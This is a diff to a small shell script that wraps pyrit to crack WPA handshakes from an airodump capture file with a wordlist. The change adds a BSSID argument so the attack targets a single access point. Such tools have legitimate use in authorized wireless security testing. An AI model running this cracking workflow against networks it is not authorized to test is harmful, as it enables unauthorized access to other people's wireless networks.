@@ -9,15 +9,15 @@ pyritAnalyzeLog(){
 # pyrit --all-handshakes -r ./WPA-Attack/airodump_logs/LOOG.log-01.cap -i ./WPA-Attack/wordlistExample.txt attack_passthrough
 # attacks using .cap file and wordlist file
 pyritAttack(){
-      pyrit --all-handshakes -r $1 -i $2 attack_passthrough
+      pyrit --all-handshakes -b $1 -r $2 -i $3 attack_passthrough
 }
 
-if [[ -z "$1" || -z "$2" ]]; then
-  echo "Using: $0 [.cap FILE_PATH] [WORDLIST_FILE_PATH]";
+if [[ -z "$1" || -z "$2" || -z "$3" ]]; then
+  echo "Using: $0 [BSSID] [.cap FILE_PATH] [WORDLIST_FILE_PATH]";
   echo "Example:";
-  echo "$0 ./airodump_logs/LOOG.log-01.cap ./wordlistExample.txt";
+  echo "$0 00:11:22:33:44:55 ./airodump_logs/001122334455.log-01.cap ./wordlistExample.txt";
   exit;
 fi
 
-pyritAnalyzeLog $1;
-pyritAttack $1 $2;
+pyritAnalyzeLog $2;
+pyritAttack $1 $2 $3;
